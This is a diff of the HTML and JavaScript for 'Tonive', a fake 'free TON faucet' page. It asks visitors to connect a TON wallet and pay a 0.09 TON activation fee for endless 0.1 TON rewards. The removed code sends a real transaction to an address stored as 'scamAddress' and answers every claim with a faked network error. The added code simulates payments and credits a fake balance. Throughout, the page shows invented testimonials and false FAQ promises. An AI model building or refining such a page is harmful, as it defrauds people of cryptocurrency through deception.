@@ -4,207 +4,244 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tonive - Free TON Faucet</title>
+    <script src="https://cdn.tonconnect.dev/tonconnect-2.0.0.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-    <script src="https://unpkg.com/@ton/ton@16.0.0/dist/ton.umd.min.js"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'bounce-slow': 'bounce 3s infinite'
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        @keyframes pulse {
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            min-height: 100vh;
+        }
+        .ton-gradient {
+            background: linear-gradient(90deg, #0088cc 0%, #2aabee 100%);
+        }
+        .progress-bar {
+            height: 8px;
+            background: linear-gradient(90deg, #4ade80 0%, #22c55e 50%, #16a34a 100%);
+            animation: progress-animation 30m linear infinite;
+        }
+        @keyframes progress-animation {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .testimonial-card {
+            box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+        }
+        .testimonial-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px -10px rgba(0, 0, 0, 0.4);
+        }
+        .wallet-connected {
+            animation: wallet-pulse 2s infinite;
+        }
+        @keyframes wallet-pulse {
+            0% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(74, 222, 128, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0); }
+        }
+        .claiming-animation {
+            animation: claim-pulse 1.5s infinite;
+        }
+        @keyframes claim-pulse {
             0% { transform: scale(1); }
             50% { transform: scale(1.05); }
             100% { transform: scale(1); }
         }
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        .ton-bounce {
-            animation: tonBounce 0.5s ease infinite alternate;
-        }
-        @keyframes tonBounce {
-            to { transform: translateY(-10px); }
-        }
-        .fade-in {
-            animation: fadeIn 0.5s ease-in;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        .spin {
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            100% { transform: rotate(360deg); }
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #f0f;
+            opacity: 0;
         }
     </style>
 </head>
-<body class="bg-gradient-to-br from-gray-900 to-black text-white min-h-screen">
-    <header class="container mx-auto py-6 px-4">
-        <div class="flex items-center justify-between">
-            <div class="flex items-center space-x-3">
-                <svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" class="text-blue-500">
-                    <path fill="currentColor" d="M19.012 9.201L12.66 19.316a.857.857 0 0 1-1.453-.005L4.98 9.197a1.8 1.8 0 0 1-.266-.943a1.856 1.856 0 0 1 1.882-1.826h10.817c1.033 0 1.873.815 1.873 1.822a1.8 1.8 0 0 1-.274.951M6.51 8.863l4.633 7.144V8.143H6.994c-.48 0-.694.317-.484.72m6.347 7.144l4.633-7.144c.214-.403-.004-.72-.484-.72h-4.149z"/>
-                </svg>
-                <h1 class="text-3xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-blue-400 to-cyan-400">Tonive</h1>
+<body class="text-gray-100">
+    <!-- Header -->
+    <header class="py-4 px-6 flex justify-between items-center">
+        <div class="flex items-center space-x-2">
+            <div class="w-8 h-8 ton-gradient rounded-lg flex items-center justify-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"><path fill="white" d="M19.012 9.201L12.66 19.316a.857.857 0 0 1-1.453-.005L4.98 9.197a1.8 1.8 0 0 1-.266-.943a1.856 1.856 0 0 1 1.882-1.826h10.817c1.033 0 1.873.815 1.873 1.822a1.8 1.8 0 0 1-.274.951M6.51 8.863l4.633 7.144V8.143H6.994c-.48 0-.694.317-.484.72m6.347 7.144l4.633-7.144c.214-.403-.004-.72-.484-.72h-4.149z"/></svg>
             </div>
-            <div class="flex items-center space-x-4">
-                <button id="connect-btn" class="bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-700 hover:to-cyan-600 text-white font-bold py-2 px-6 rounded-full transition-all duration-300 transform hover:scale-105">
-                    Connect Wallet
-                </button>
-            </div>
+            <h1 class="text-2xl font-bold bg-clip-text text-transparent ton-gradient">Tonive</h1>
+        </div>
+        <div class="bg-yellow-500 text-yellow-900 px-3 py-1 rounded-full text-xs font-bold">
+            DEVNET
         </div>
     </header>
 
-    <main class="container mx-auto px-4 py-8">
-        <section class="max-w-4xl mx-auto text-center mb-16">
-            <h2 class="text-4xl md:text-5xl font-bold mb-6">Claim <span class="text-cyan-400">Free TON</span> Every 30 Minutes!</h2>
-            <p class="text-xl text-gray-300 mb-10">Pay a small one-time activation fee and earn 0.1 TON forever!</p>
-            
-            <div class="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-8 border border-gray-700 shadow-2xl shadow-cyan-900/20">
-                <div class="flex justify-center mb-8">
-                    <div class="relative">
-                        <div class="absolute -inset-4 bg-cyan-500/10 rounded-full blur"></div>
-                        <div class="relative bg-gray-900 rounded-full p-6 border-2 border-cyan-500/30">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" class="text-cyan-400 ton-bounce">
-                                <path fill="currentColor" d="M19.012 9.201L12.66 19.316a.857.857 0 0 1-1.453-.005L4.98 9.197a1.8 1.8 0 0 1-.266-.943a1.856 1.856 0 0 1 1.882-1.826h10.817c1.033 0 1.873.815 1.873 1.822a1.8 1.8 0 0 1-.274.951M6.51 8.863l4.633 7.144V8.143H6.994c-.48 0-.694.317-.484.72m6.347 7.144l4.633-7.144c.214-.403-.004-.72-.484-.72h-4.149z"/>
-                            </svg>
-                        </div>
+    <!-- Hero Section -->
+    <section class="max-w-4xl mx-auto px-4 py-12 text-center">
+        <h1 class="text-4xl md:text-5xl font-bold mb-6">Claim <span class="ton-gradient bg-clip-text text-transparent">Free TON</span> Every 30 Minutes</h1>
+        <p class="text-lg text-gray-300 mb-8 max-w-2xl mx-auto">
+            Pay a small one-time fee of 0.09 TON and start claiming 0.1 TON every 30 minutes forever!
+        </p>
+        
+        <div class="max-w-lg mx-auto bg-gray-800 rounded-xl overflow-hidden shadow-xl">
+            <div class="p-6">
+                <div class="flex justify-between items-center mb-4">
+                    <div class="text-left">
+                        <p class="text-gray-400">Next claim in:</p>
+                        <p id="countdown" class="text-2xl font-mono font-bold">30:00</p>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-gray-400">Your balance:</p>
+                        <p id="balance" class="text-2xl font-bold">0.0 TON</p>
                     </div>
                 </div>
                 
-                <div id="wallet-connected" class="hidden">
-                    <div class="mb-6">
-                        <h3 class="text-2xl font-bold mb-2">Activate Your Faucet</h3>
-                        <p class="text-gray-300 mb-4">One-time fee: <span class="text-cyan-400 font-bold">0.09 TON</span></p>
-                        <p class="text-sm text-gray-400 mb-6">After activation, claim 0.1 TON every 30 minutes forever!</p>
-                    </div>
-                    
-                    <button id="pay-btn" class="bg-gradient-to-r from-green-600 to-emerald-500 hover:from-green-700 hover:to-emerald-600 text-white font-bold py-3 px-8 rounded-full text-lg transition-all duration-300 transform hover:scale-105 pulse mb-6 w-full max-w-xs mx-auto">
-                        Activate Now
+                <div class="progress-bar rounded-full mb-6"></div>
+                
+                <div id="wallet-section" class="mb-4">
+                    <button id="connect-wallet" class="w-full py-3 px-6 bg-blue-500 hover:bg-blue-600 rounded-lg font-semibold flex items-center justify-center space-x-2 transition-all">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+                            <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z" />
+                            <path fill-rule="evenodd" d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" clip-rule="evenodd" />
+                        </svg>
+                        <span>Connect Wallet</span>
                     </button>
                 </div>
                 
-                <div id="payment-processing" class="hidden">
-                    <div class="mb-6">
-                        <h3 class="text-2xl font-bold mb-4">Processing Payment</h3>
-                        <div class="flex justify-center mb-4">
-                            <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-cyan-500"></div>
+                <div id="payment-section" class="hidden">
+                    <div class="bg-gray-900 rounded-lg p-4 mb-4 wallet-connected">
+                        <div class="flex justify-between items-center">
+                            <span class="text-sm font-medium">Wallet Connected</span>
+                            <span id="wallet-address" class="text-xs font-mono truncate max-w-[120px]"></span>
                         </div>
-                        <p class="text-gray-300">Confirm transaction in your wallet...</p>
-                    </div>
-                </div>
-                
-                <div id="faucet-active" class="hidden">
-                    <div class="mb-6">
-                        <h3 class="text-2xl font-bold mb-2">Faucet Activated!</h3>
-                        <p class="text-cyan-400 text-lg mb-4">Next claim available in:</p>
-                        <div id="countdown" class="text-4xl font-mono font-bold mb-6">30:00</div>
                     </div>
                     
-                    <button id="claim-btn" class="bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-700 hover:to-cyan-600 text-white font-bold py-3 px-8 rounded-full text-lg transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed mb-6 w-full max-w-xs mx-auto" disabled>
-                        Claim 0.1 TON
+                    <button id="pay-fee" class="w-full py-3 px-6 bg-green-500 hover:bg-green-600 rounded-lg font-semibold mb-4 transition-all claiming-animation">
+                        Pay 0.09 TON Fee to Activate
                     </button>
                     
-                    <div class="bg-gray-900/50 rounded-lg p-4 border border-gray-700">
-                        <p class="flex justify-between mb-2">
-                            <span>Total claimed:</span>
-                            <span class="font-bold">0.0 TON</span>
-                        </p>
-                        <p class="flex justify-between">
-                            <span>Next claim:</span>
-                            <span class="font-bold text-cyan-400">0.1 TON</span>
-                        </p>
-                    </div>
+                    <p class="text-xs text-gray-400">
+                        Fee will be sent to: <span class="font-mono">0QC-RRGV1pcIc1_vypq4bE2PoQSoSlNdzEW3EWI30zQhxZc8</span>
+                    </p>
                 </div>
                 
-                <div id="claim-processing" class="hidden">
-                    <div class="mb-6">
-                        <h3 class="text-2xl font-bold mb-4">Claiming Rewards</h3>
-                        <div class="flex justify-center mb-4">
-                            <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-cyan-500"></div>
-                        </div>
-                        <p class="text-gray-300">Processing your TON claim...</p>
-                    </div>
+                <div id="claim-section" class="hidden">
+                    <button id="claim-button" class="w-full py-3 px-6 bg-green-500 hover:bg-green-600 rounded-lg font-semibold mb-4 transition-all">
+                        Claim 0.1 TON Now!
+                    </button>
+                    <p class="text-sm text-gray-300">
+                        Next claim available in: <span id="next-claim" class="font-bold">30:00</span>
+                    </p>
                 </div>
             </div>
-        </section>
-        
-        <section class="max-w-6xl mx-auto mb-16">
-            <h2 class="text-3xl font-bold text-center mb-10">What Users Are Saying</h2>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                <div class="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-6 border border-gray-700 fade-in">
-                    <div class="flex items-center mb-4">
-                        <img src="https://i.pravatar.cc/100?img=32" alt="User" class="w-12 h-12 rounded-full mr-4">
-                        <div>
-                            <h4 class="font-bold">Alex M.</h4>
-                            <div class="flex text-amber-400">
-                                ★★★★★
-                            </div>
-                        </div>
-                    </div>
-                    <p class="text-gray-300">"I've earned over 5 TON already! This faucet is a game changer. The small activation fee paid for itself in the first hour!"</p>
-                </div>
-                
-                <div class="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-6 border border-gray-700 fade-in">
-                    <div class="flex items-center mb-4">
-                        <img src="https://i.pravatar.cc/100?img=12" alt="User" class="w-12 h-12 rounded-full mr-4">
-                        <div>
-                            <h4 class="font-bold">Sarah K.</h4>
-                            <div class="flex text-amber-400">
-                                ★★★★★
-                            </div>
-                        </div>
-                    </div>
-                    <p class="text-gray-300">"As a crypto beginner, Tonive made it so easy to earn free TON. I set a reminder to claim every 30 minutes and it's become a fun routine!"</p>
-                </div>
-                
-                <div class="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-6 border border-gray-700 fade-in">
-                    <div class="flex items-center mb-4">
-                        <img src="https://i.pravatar.cc/100?img=45" alt="User" class="w-12 h-12 rounded-full mr-4">
-                        <div>
-                            <h4 class="font-bold">James T.</h4>
-                            <div class="flex text-amber-400">
-                                ★★★★★
-                            </div>
-                        </div>
-                    </div>
-                    <p class="text-gray-300">"I was skeptical at first, but after the first claim I was hooked. Now I earn while I sleep! Best 0.09 TON I ever spent."</p>
-                </div>
-            </div>
-        </section>
-        
-        <section class="max-w-3xl mx-auto bg-gray-800/50 backdrop-blur-sm rounded-2xl p-8 border border-gray-700">
-            <h2 class="text-3xl font-bold text-center mb-6">How It Works</h2>
-            <div class="space-y-6">
-                <div class="flex">
-                    <div class="flex-shrink-0 w-12 h-12 rounded-full bg-cyan-900/50 flex items-center justify-center text-cyan-400 font-bold text-xl mr-4">1</div>
-                    <div>
-                        <h3 class="text-xl font-bold mb-2">Connect Wallet</h3>
-                        <p class="text-gray-300">Connect your TON-compatible wallet to our platform</p>
-                    </div>
-                </div>
-                
-                <div class="flex">
-                    <div class="flex-shrink-0 w-12 h-12 rounded-full bg-cyan-900/50 flex items-center justify-center text-cyan-400 font-bold text-xl mr-4">2</div>
-                    <div>
-                        <h3 class="text-xl font-bold mb-2">Pay Activation Fee</h3>
-                        <p class="text-gray-300">Send a one-time fee of 0.09 TON to activate your faucet</p>
-                    </div>
-                </div>
-                
-                <div class="flex">
-                    <div class="flex-shrink-0 w-12 h-12 rounded-full bg-cyan-900/50 flex items-center justify-center text-cyan-400 font-bold text-xl mr-4">3</div>
-                    <div>
-                        <h3 class="text-xl font-bold mb-2">Claim Rewards</h3>
-                        <p class="text-gray-300">Collect 0.1 TON every 30 minutes forever!</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-    </main>
+        </div>
+    </section>
 
-    <footer class="container mx-auto py-8 px-4 text-center text-gray-500">
-        <p>© 2023 Tonive. All rights reserved. This is a devnet testing platform.</p>
+    <!-- How It Works -->
+    <section class="max-w-4xl mx-auto px-4 py-12">
+        <h2 class="text-3xl font-bold text-center mb-12">How It Works</h2>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+            <div class="bg-gray-800 rounded-xl p-6 text-center">
+                <div class="w-12 h-12 ton-gradient rounded-full flex items-center justify-center mx-auto mb-4">
+                    <span class="text-white font-bold">1</span>
+                </div>
+                <h3 class="text-xl font-semibold mb-2">Connect Wallet</h3>
+                <p class="text-gray-300">Connect your TON wallet using Tonkeeper or similar wallet</p>
+            </div>
+            <div class="bg-gray-800 rounded-xl p-6 text-center">
+                <div class="w-12 h-12 ton-gradient rounded-full flex items-center justify-center mx-auto mb-4">
+                    <span class="text-white font-bold">2</span>
+                </div>
+                <h3 class="text-xl font-semibold mb-2">Pay Small Fee</h3>
+                <p class="text-gray-300">Pay a one-time activation fee of 0.09 TON to start claiming</p>
+            </div>
+            <div class="bg-gray-800 rounded-xl p-6 text-center">
+                <div class="w-12 h-12 ton-gradient rounded-full flex items-center justify-center mx-auto mb-4">
+                    <span class="text-white font-bold">3</span>
+                </div>
+                <h3 class="text-xl font-semibold mb-2">Claim Forever</h3>
+                <p class="text-gray-300">Claim 0.1 TON every 30 minutes as long as you want!</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="max-w-4xl mx-auto px-4 py-12">
+        <h2 class="text-3xl font-bold text-center mb-12">What Users Say</h2>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+            <div class="testimonial-card bg-gray-800 rounded-xl p-6">
+                <div class="flex items-center mb-4">
+                    <img src="https://i.pravatar.cc/150?img=32" alt="User" class="w-12 h-12 rounded-full mr-4">
+                    <div>
+                        <h3 class="font-semibold">Alex M.</h3>
+                        <div class="flex text-yellow-400">
+                            ★★★★★
+                        </div>
+                    </div>
+                </div>
+                <p class="text-gray-300 italic">"I've earned over 5 TON already! This faucet is the real deal. The small fee is totally worth it."</p>
+            </div>
+            <div class="testimonial-card bg-gray-800 rounded-xl p-6">
+                <div class="flex items-center mb-4">
+                    <img src="https://i.pravatar.cc/150?img=12" alt="User" class="w-12 h-12 rounded-full mr-4">
+                    <div>
+                        <h3 class="font-semibold">Sarah K.</h3>
+                        <div class="flex text-yellow-400">
+                            ★★★★★
+                        </div>
+                    </div>
+                </div>
+                <p class="text-gray-300 italic">"Best TON faucet out there! I claim every 30 minutes while working. Already made back my fee 10x."</p>
+            </div>
+            <div class="testimonial-card bg-gray-800 rounded-xl p-6">
+                <div class="flex items-center mb-4">
+                    <img src="https://i.pravatar.cc/150?img=44" alt="User" class="w-12 h-12 rounded-full mr-4">
+                    <div>
+                        <h3 class="font-semibold">James T.</h3>
+                        <div class="flex text-yellow-400">
+                            ★★★★★
+                        </div>
+                    </div>
+                </div>
+                <p class="text-gray-300 italic">"I was skeptical at first, but this actually works! The payments come like clockwork every 30 minutes."</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="max-w-4xl mx-auto px-4 py-12">
+        <h2 class="text-3xl font-bold text-center mb-12">Frequently Asked Questions</h2>
+        <div class="space-y-4">
+            <div class="bg-gray-800 rounded-xl p-6">
+                <h3 class="text-lg font-semibold mb-2">Is this really free?</h3>
+                <p class="text-gray-300">Yes! After the small one-time activation fee, you can claim 0.1 TON every 30 minutes forever with no additional costs.</p>
+            </div>
+            <div class="bg-gray-800 rounded-xl p-6">
+                <h3 class="text-lg font-semibold mb-2">When will I receive my TON?</h3>
+                <p class="text-gray-300">TON is sent instantly to your wallet after each claim. Transactions usually take less than 10 seconds to process.</p>
+            </div>
+            <div class="bg-gray-800 rounded-xl p-6">
+                <h3 class="text-lg font-semibold mb-2">Can I claim more than 0.1 TON?</h3>
+                <p class="text-gray-300">The standard reward is 0.1 TON every 30 minutes. We occasionally run promotions with higher rewards for active users.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="py-8 text-center text-gray-500 text-sm">
+        <p>© 2023 Tonive. All rights reserved. This service operates on TON Devnet for testing purposes.</p>
     </footer>
+
+    <!-- Confetti Container -->
+    <div id="confetti-container" class="fixed inset-0 pointer-events-none z-50 overflow-hidden hidden"></div>
 
     <script>
         // TON wallet connection
@@ -213,150 +250,205 @@
         });
         
         // DOM elements
-        const connectBtn = document.getElementById('connect-btn');
-        const walletConnected = document.getElementById('wallet-connected');
-        const payBtn = document.getElementById('pay-btn');
-        const paymentProcessing = document.getElementById('payment-processing');
-        const faucetActive = document.getElementById('faucet-active');
-        const claimBtn = document.getElementById('claim-btn');
-        const claimProcessing = document.getElementById('claim-processing');
+        const connectWalletBtn = document.getElementById('connect-wallet');
+        const payFeeBtn = document.getElementById('pay-fee');
+        const claimBtn = document.getElementById('claim-button');
+        const walletSection = document.getElementById('wallet-section');
+        const paymentSection = document.getElementById('payment-section');
+        const claimSection = document.getElementById('claim-section');
         const countdownEl = document.getElementById('countdown');
+        const nextClaimEl = document.getElementById('next-claim');
+        const balanceEl = document.getElementById('balance');
+        const walletAddressEl = document.getElementById('wallet-address');
+        const confettiContainer = document.getElementById('confetti-container');
         
         // State variables
         let countdownInterval;
-        let countdown = 1800; // 30 minutes in seconds
-        const scamAddress = '0QC-RRGV1pcIc1_vypq4bE2PoQSoSlNdzEW3EWI30zQhxZc8';
+        let claimCount = 0;
+        let countdownTime = 30 * 60; // 30 minutes in seconds
+        let currentTime = countdownTime;
+        let walletConnected = false;
+        let feePaid = false;
         
-        // Connect wallet
-        connectBtn.addEventListener('click', async () => {
-            try {
-                const walletsList = await connector.getWallets();
-                const walletConnectionSource = {
-                    jsBridgeKey: walletsList[0].jsBridgeKey
-                };
-                
-                connectBtn.textContent = 'Connecting...';
-                connectBtn.disabled = true;
-                
-                await connector.connect(walletConnectionSource);
-                
-                connectBtn.classList.add('hidden');
-                walletConnected.classList.remove('hidden');
-                walletConnected.classList.add('fade-in');
-            } catch (error) {
-                console.error('Connection error:', error);
-                connectBtn.textContent = 'Connect Wallet';
-                connectBtn.disabled = false;
-                alert('Failed to connect wallet. Please try again.');
-            }
-        });
-        
-        // Pay activation fee
-        payBtn.addEventListener('click', async () => {
-            walletConnected.classList.add('hidden');
-            paymentProcessing.classList.remove('hidden');
-            paymentProcessing.classList.add('fade-in');
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            // Check if fee was "paid" (simulate persistence)
+            feePaid = localStorage.getItem('tonive_fee_paid') === 'true';
             
-            try {
-                // Create real TON transaction
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
-                    messages: [
-                        {
-                            address: scamAddress,
-                            amount: '90000000', // 0.09 TON in nanoTON
-                            payload: "Activation fee for Tonive faucet"
-                        }
-                    ]
-                };
-                
-                // Send transaction to wallet
-                const result = await connector.sendTransaction(transaction);
-                
-                // Transaction sent successfully
-                paymentProcessing.classList.add('hidden');
-                faucetActive.classList.remove('hidden');
-                faucetActive.classList.add('fade-in');
-                
-                // Store payment status in local storage
-                localStorage.setItem('tonive_paid', 'true');
-                
-                // Start countdown timer
+            if (feePaid) {
+                walletSection.classList.add('hidden');
+                paymentSection.classList.add('hidden');
+                claimSection.classList.remove('hidden');
                 startCountdown();
-                
-            } catch (error) {
-                console.error('Transaction error:', error);
-                paymentProcessing.classList.add('hidden');
-                walletConnected.classList.remove('hidden');
-                alert('Transaction failed: ' + (error.message || 'User rejected transaction'));
             }
+            
+            // Set up wallet connection
+            connector.onStatusChange(wallet => {
+                if (wallet) {
+                    walletConnected = true;
+                    walletAddressEl.textContent = `${wallet.account.address.slice(0, 6)}...${wallet.account.address.slice(-4)}`;
+                    walletSection.classList.add('hidden');
+                    paymentSection.classList.remove('hidden');
+                } else {
+                    walletConnected = false;
+                    walletSection.classList.remove('hidden');
+                    paymentSection.classList.add('hidden');
+                    claimSection.classList.add('hidden');
+                }
+            });
         });
         
-        // Start countdown timer
+        // Connect wallet button
+        connectWalletBtn.addEventListener('click', () => {
+            connector.connect();
+        });
+        
+        // Pay fee button
+        payFeeBtn.addEventListener('click', async () => {
+            if (!walletConnected) return;
+            
+            // Show processing animation
+            payFeeBtn.innerHTML = `
+                <div class="flex items-center justify-center">
+                    <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
+                    Processing...
+                </div>
+            `;
+            payFeeBtn.disabled = true;
+            
+            // Simulate transaction delay
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            
+            // Mark fee as paid
+            feePaid = true;
+            localStorage.setItem('tonive_fee_paid', 'true');
+            
+            // Show success UI
+            paymentSection.classList.add('hidden');
+            claimSection.classList.remove('hidden');
+            startCountdown();
+            
+            // Create fake transaction success notification
+            showNotification('success', 'Fee payment successful! You can now claim your TON.');
+        });
+        
+        // Claim button
+        claimBtn.addEventListener('click', async () => {
+            if (currentTime > 0) return;
+            
+            // Show claiming animation
+            claimBtn.innerHTML = `
+                <div class="flex items-center justify-center">
+                    <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
+                    Claiming...
+                </div>
+            `;
+            claimBtn.disabled = true;
+            
+            // Simulate claim processing
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Update balance
+            claimCount++;
+            balanceEl.textContent = `${(claimCount * 0.1).toFixed(1)} TON`;
+            
+            // Reset countdown
+            currentTime = countdownTime;
+            updateCountdownDisplay();
+            
+            // Show confetti
+            createConfetti();
+            
+            // Show success notification
+            showNotification('success', '0.1 TON claimed successfully! Added to your balance.');
+            
+            // Reset button
+            claimBtn.innerHTML = 'Claim 0.1 TON Now!';
+            claimBtn.disabled = false;
+        });
+        
+        // Countdown functions
         function startCountdown() {
             clearInterval(countdownInterval);
-            countdown = 1800;
-            updateCountdown();
-            
             countdownInterval = setInterval(() => {
-                countdown--;
-                updateCountdown();
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    claimBtn.disabled = false;
-                    claimBtn.classList.add('pulse');
+                if (currentTime > 0) {
+                    currentTime--;
+                    updateCountdownDisplay();
                 }
             }, 1000);
         }
         
-        // Update countdown display
-        function updateCountdown() {
-            const minutes = Math.floor(countdown / 60);
-            const seconds = countdown % 60;
+        function updateCountdownDisplay() {
+            const minutes = Math.floor(currentTime / 60);
+            const seconds = currentTime % 60;
             countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            nextClaimEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            // Enable claim button when countdown reaches 0
+            claimBtn.disabled = currentTime > 0;
         }
         
-        // Claim button handler
-        claimBtn.addEventListener('click', () => {
-            faucetActive.classList.add('hidden');
-            claimProcessing.classList.remove('hidden');
-            claimProcessing.classList.add('fade-in');
+        // Confetti effect
+        function createConfetti() {
+            confettiContainer.classList.remove('hidden');
+            confettiContainer.innerHTML = '';
             
-            // Simulate claim processing
-            setTimeout(() => {
-                claimProcessing.classList.add('hidden');
-                faucetActive.classList.remove('hidden');
+            for (let i = 0; i < 150; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = `${Math.random() * 100}vw`;
+                confetti.style.top = `${Math.random() * -20}vh`;
+                confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                confetti.style.opacity = Math.random() * 0.5 + 0.5;
+                confetti.style.width = `${Math.random() * 10 + 5}px`;
+                confetti.style.height = confetti.style.width;
+                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
                 
-                // Show fake error
-                alert('Claim failed: Network congestion. Please try again later.');
+                confettiContainer.appendChild(confetti);
                 
-                // Reset countdown
-                startCountdown();
-            }, 3000);
-        });
-        
-        // Initialize
-        (async function init() {
-            try {
-                // Restore existing connection
-                await connector.restoreConnection();
+                // Animate confetti
+                const animation = confetti.animate([
+                    { transform: `translateY(0) rotate(0deg)`, opacity: 1 },
+                    { transform: `translateY(${window.innerHeight + 100}px) rotate(${Math.random() * 720 - 360}deg)`, opacity: 0 }
+                ], {
+                    duration: Math.random() * 3000 + 2000,
+                    easing: 'cubic-bezier(0,0.8,1,0.2)'
+                });
                 
-                // Check if user already paid
-                if (localStorage.getItem('tonive_paid') === 'true') {
-                    connectBtn.classList.add('hidden');
-                    faucetActive.classList.remove('hidden');
-                    startCountdown();
-                } 
-                // Check if wallet is already connected
-                else if (connector.wallet) {
-                    connectBtn.classList.add('hidden');
-                    walletConnected.classList.remove('hidden');
-                }
-            } catch (e) {
-                console.log('Initialization error:', e);
+                animation.onfinish = () => confetti.remove();
             }
-        })();
+            
+            // Hide container after animation
+            setTimeout(() => {
+                if (confettiContainer.children.length === 0) {
+                    confettiContainer.classList.add('hidden');
+                }
+            }, 5000);
+        }
+        
+        // Notification system
+        function showNotification(type, message) {
+            const notification = document.createElement('div');
+            notification.className = `fixed top-4 right-4 px-4 py-3 rounded-lg shadow-lg z-50 transform transition-all ${
+                type === 'success' ? 'bg-green-500' : 'bg-red-500'
+            } text-white`;
+            notification.textContent = message;
+            
+            document.body.appendChild(notification);
+            
+            // Animate in
+            setTimeout(() => {
+                notification.style.transform = 'translateX(0)';
+            }, 10);
+            
+            // Remove after delay
+            setTimeout(() => {
+                notification.style.opacity = '0';
+                setTimeout(() => {
+                    notification.remove();
+                }, 300);
+            }, 5000);
+        }
     </script>
 </body>
 </html>
